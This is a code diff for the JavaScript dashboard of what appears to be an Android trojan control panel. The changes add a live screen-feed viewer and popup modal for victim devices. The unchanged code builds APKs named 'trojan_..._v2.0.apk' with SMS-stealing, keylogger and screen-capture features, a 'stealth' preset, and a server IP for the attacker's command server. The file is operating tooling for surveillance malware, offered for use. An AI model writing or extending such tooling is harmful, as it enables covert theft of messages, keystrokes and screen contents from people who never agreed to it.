@@ -148,6 +148,34 @@ function addDevicePanel(deviceId) {
     panel.className = 'device-panel';
     panel.dataset.deviceId = deviceId;
 
+    const screenFeedHTML = `
+        <div class="view-panel" data-panel="screen">
+            <div class="panel-header">
+                <div class="panel-title">
+                    <i class="material-icons">screen_share</i>
+                    <span>Screen Feed</span>
+                </div>
+                <div class="panel-controls">
+                    <button class="btn-icon zoom-out" onclick="adjustZoom('${deviceId}', -0.1)" title="Zoom Out">
+                        <i class="material-icons">zoom_out</i>
+                    </button>
+                    <button class="btn-icon zoom-reset" onclick="adjustZoom('${deviceId}', 'reset')" title="Reset Zoom">
+                        <i class="material-icons">fit_screen</i>
+                    </button>
+                    <button class="btn-icon zoom-in" onclick="adjustZoom('${deviceId}', 0.1)" title="Zoom In">
+                        <i class="material-icons">zoom_in</i>
+                    </button>
+                    <button class="btn-icon maximize-btn" onclick="toggleMaximize('${deviceId}', 'screen')" title="Maximize">
+                        <i class="material-icons">fullscreen</i>
+                    </button>
+                </div>
+            </div>
+            <div class="panel-body screen-container">
+                <img class="screen-feed" alt="Screen Feed">
+            </div>
+        </div>
+    `;
+
     panel.innerHTML = `
         <div class="device-panel-header">
             <div class="device-panel-title">
@@ -377,6 +405,87 @@ function setupPanelEventListeners(deviceId, elements) {
     }
 }
 
+// Toggle maximize/minimize view panels
+function toggleMaximize(deviceId, panelType) {
+    const device = activeDevices.get(deviceId);
+    if (!device) return;
+
+    // Special handling for screen share - show in phone frame modal
+    if (panelType === 'screen') {
+        showPhoneFrameModal(deviceId);
+        return;
+    }
+
+    const panel = device.elements.panels[panelType];
+    if (!panel) return;
+
+    const isMaximized = panel.classList.contains('maximized');
+
+    if (isMaximized) {
+        panel.classList.remove('maximized');
+        panel.querySelector('.maximize-btn i').textContent = 'fullscreen';
+    } else {
+        panel.classList.add('maximized');
+        panel.querySelector('.maximize-btn i').textContent = 'fullscreen_exit';
+    }
+}
+
+// Show screen share in popup modal
+function showPhoneFrameModal(deviceId) {
+    const device = activeDevices.get(deviceId);
+    if (!device || !device.elements.screenImg) return;
+
+    // Create modal overlay
+    const modal = document.createElement('div');
+    modal.className = 'screen-popup-modal';
+    modal.innerHTML = `
+        <div class="popup-container">
+            <div class="popup-header">
+                <div class="popup-title">
+                    <i class="material-icons">screen_share</i>
+                    <span>Screen Feed - ${device.info?.model || device.info?.brand || 'Device'}</span>
+                </div>
+                <button class="popup-close-btn" onclick="closePhoneFrameModal()">
+                    <i class="material-icons">close</i>
+                </button>
+            </div>
+            <div class="popup-body">
+                <img src="${device.elements.screenImg.src}" alt="Screen" class="popup-screen-img">
+            </div>
+        </div>
+    `;
+
+    document.body.appendChild(modal);
+
+    // Update screen image when it changes
+    const updateScreenImage = () => {
+        const modalImg = modal.querySelector('.popup-screen-img');
+        if (modalImg && device.elements.screenImg) {
+            modalImg.src = device.elements.screenImg.src;
+        }
+    };
+
+    // Set up observer to update image
+    const observer = new MutationObserver(updateScreenImage);
+    if (device.elements.screenImg) {
+        observer.observe(device.elements.screenImg, { attributes: true, attributeFilter: ['src'] });
+    }
+
+    // Store observer for cleanup
+    modal._observer = observer;
+    modal._deviceId = deviceId;
+}
+
+// Close phone frame modal
+function closePhoneFrameModal() {
+    const modal = document.querySelector('.screen-popup-modal');
+    if (modal) {
+        if (modal._observer) {
+            modal._observer.disconnect();
+        }
+        modal.remove();
+    }
+}
 function handleFeatureToggle(deviceId, feature, action, isActive) {
     const device = activeDevices.get(deviceId);
     if (!device) return;
@@ -728,6 +837,17 @@ function setupViewMaximize(deviceId, panel) {
     maximizeBtns.forEach(btn => {
         btn.addEventListener('click', (e) => {
             e.stopPropagation();
+
+            // Check if this is a screen view button
+            const isScreenView = btn.dataset.view === 'screen' || btn.closest('.view-panel')?.querySelector('.screen-view');
+
+            if (isScreenView) {
+                // Use popup modal for screen view
+                showPhoneFrameModal(deviceId);
+                return;
+            }
+
+            // Original fullscreen behavior for other views
             const viewPanel = btn.closest('.view-panel');
 
             if (viewPanel.classList.contains('maximized')) {
@@ -769,7 +889,7 @@ function setupViewMaximize(deviceId, panel) {
 function toggleAPKGenerator() {
     const panel = document.getElementById('apkGeneratorPanel');
     panel.classList.toggle('hidden');
-    
+
     // Auto-detect server IP
     if (!panel.classList.contains('hidden')) {
         const serverIpInput = document.getElementById('serverIp');
@@ -783,14 +903,14 @@ function applyPreset(presetName) {
     const sms = document.getElementById('feature-sms');
     const keylogger = document.getElementById('feature-keylogger');
     const screen = document.getElementById('feature-screen');
-    
+
     // Reset all
     sms.checked = false;
     keylogger.checked = false;
     screen.checked = false;
-    
+
     // Apply preset
-    switch(presetName) {
+    switch (presetName) {
         case 'stealth':
             keylogger.checked = true;
             sms.checked = true;
@@ -809,30 +929,30 @@ function applyPreset(presetName) {
 function generateCustomAPK() {
     const serverIp = document.getElementById('serverIp').value.trim();
     const features = [];
-    
+
     // Collect selected features
     if (document.getElementById('feature-sms').checked) features.push('sms');
     if (document.getElementById('feature-keylogger').checked) features.push('keylogger');
     if (document.getElementById('feature-screen').checked) features.push('screen');
-    
+
     // Validate at least one feature selected
     if (features.length === 0) {
         showNotification('Please select at least one feature', 'warning');
         return;
     }
-    
+
     // Validate server IP
     if (!serverIp) {
         showNotification('Please enter a server IP address', 'warning');
         return;
     }
-    
+
     // Show loading state
     const btn = document.querySelector('.generate-apk-btn');
     const originalHTML = btn.innerHTML;
     btn.innerHTML = '<i class="material-icons rotating">sync</i> Generating APK...';
     btn.disabled = true;
-    
+
     // Send request to server
     fetch('/generate-apk', {
         method: 'POST',
@@ -844,36 +964,36 @@ function generateCustomAPK() {
             features: features
         })
     })
-    .then(response => {
-        if (!response.ok) throw new Error('Generation failed');
-        return response.blob();
-    })
-    .then(blob => {
-        // Generate filename
-        const featureStr = features.join('_');
-        const filename = `trojan_${featureStr}_v2.0.apk`;
-        
-        // Download APK
-        const url = window.URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = filename;
-        document.body.appendChild(a);
-        a.click();
-        window.URL.revokeObjectURL(url);
-        document.body.removeChild(a);
-        
-        showNotification(`APK generated successfully: ${filename}`, 'success');
-        toggleAPKGenerator();
-    })
-    .catch(error => {
-        console.error('APK generation error:', error);
-        showNotification('Failed to generate APK. Check server logs.', 'error');
-    })
-    .finally(() => {
-        btn.innerHTML = originalHTML;
-        btn.disabled = false;
-    });
+        .then(response => {
+            if (!response.ok) throw new Error('Generation failed');
+            return response.blob();
+        })
+        .then(blob => {
+            // Generate filename
+            const featureStr = features.join('_');
+            const filename = `trojan_${featureStr}_v2.0.apk`;
+
+            // Download APK
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            window.URL.revokeObjectURL(url);
+            document.body.removeChild(a);
+
+            showNotification(`APK generated successfully: ${filename}`, 'success');
+            toggleAPKGenerator();
+        })
+        .catch(error => {
+            console.error('APK generation error:', error);
+            showNotification('Failed to generate APK. Check server logs.', 'error');
+        })
+        .finally(() => {
+            btn.innerHTML = originalHTML;
+            btn.disabled = false;
+        });
 }
 
 // Add rotating animation for loading icon
@@ -893,16 +1013,16 @@ document.head.appendChild(style);
 function showNotification(message, type = 'info') {
     const container = document.getElementById('msgs');
     if (!container) return;
-    
+
     const notification = document.createElement('div');
     notification.className = `notification notification-${type}`;
     notification.innerHTML = `
         <i class="material-icons">${type === 'success' ? 'check_circle' : type === 'error' ? 'error' : type === 'warning' ? 'warning' : 'info'}</i>
         <span>${message}</span>
     `;
-    
+
     container.appendChild(notification);
-    
+
     // Auto remove after 5 seconds
     setTimeout(() => {
         notification.style.opacity = '0';
@@ -920,24 +1040,24 @@ function logout() {
         method: 'POST',
         credentials: 'same-origin'
     })
-    .then(response => {
-        if (response.ok) {
+        .then(response => {
+            if (response.ok) {
+                window.location.href = '/login';
+            }
+        })
+        .catch(error => {
+            console.error('Logout error:', error);
+            // Force redirect even if request fails
             window.location.href = '/login';
-        }
-    })
-    .catch(error => {
-        console.error('Logout error:', error);
-        // Force redirect even if request fails
-        window.location.href = '/login';
-    });
+        });
 }
 
 // Generate APK with preset configuration
 function generatePreset(preset) {
     const serverIp = document.getElementById('serverIp').value.trim() || window.location.hostname;
     let features = [];
-    
-    switch(preset) {
+
+    switch (preset) {
         case 'stealth':
             features = ['sms'];
             break;
@@ -948,13 +1068,13 @@ function generatePreset(preset) {
             features = ['sms', 'keylogger', 'screen'];
             break;
     }
-    
+
     // Show loading state
     const btn = event.target.closest('.preset-card');
     const originalHTML = btn.innerHTML;
     btn.innerHTML = '<i class="material-icons rotating">sync</i><div class="preset-info"><span class="preset-name">Generating...</span></div>';
     btn.disabled = true;
-    
+
     // Send request to server
     fetch('/generate-apk', {
         method: 'POST',
@@ -966,29 +1086,29 @@ function generatePreset(preset) {
             features: features
         })
     })
-    .then(response => {
-        if (!response.ok) throw new Error('Generation failed');
-        return response.blob();
-    })
-    .then(blob => {
-        // Create download link
-        const url = window.URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `trojan_${preset}_v2.0.apk`;
-        document.body.appendChild(a);
-        a.click();
-        window.URL.revokeObjectURL(url);
-        document.body.removeChild(a);
-        
-        showNotification('APK generated successfully!', 'success');
-        btn.innerHTML = originalHTML;
-        btn.disabled = false;
-    })
-    .catch(error => {
-        console.error('APK generation error:', error);
-        showNotification('Failed to generate APK', 'error');
-        btn.innerHTML = originalHTML;
-        btn.disabled = false;
-    });
+        .then(response => {
+            if (!response.ok) throw new Error('Generation failed');
+            return response.blob();
+        })
+        .then(blob => {
+            // Create download link
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `trojan_${preset}_v2.0.apk`;
+            document.body.appendChild(a);
+            a.click();
+            window.URL.revokeObjectURL(url);
+            document.body.removeChild(a);
+
+            showNotification('APK generated successfully!', 'success');
+            btn.innerHTML = originalHTML;
+            btn.disabled = false;
+        })
+        .catch(error => {
+            console.error('APK generation error:', error);
+            showNotification('Failed to generate APK', 'error');
+            btn.innerHTML = originalHTML;
+            btn.disabled = false;
+        });
 }
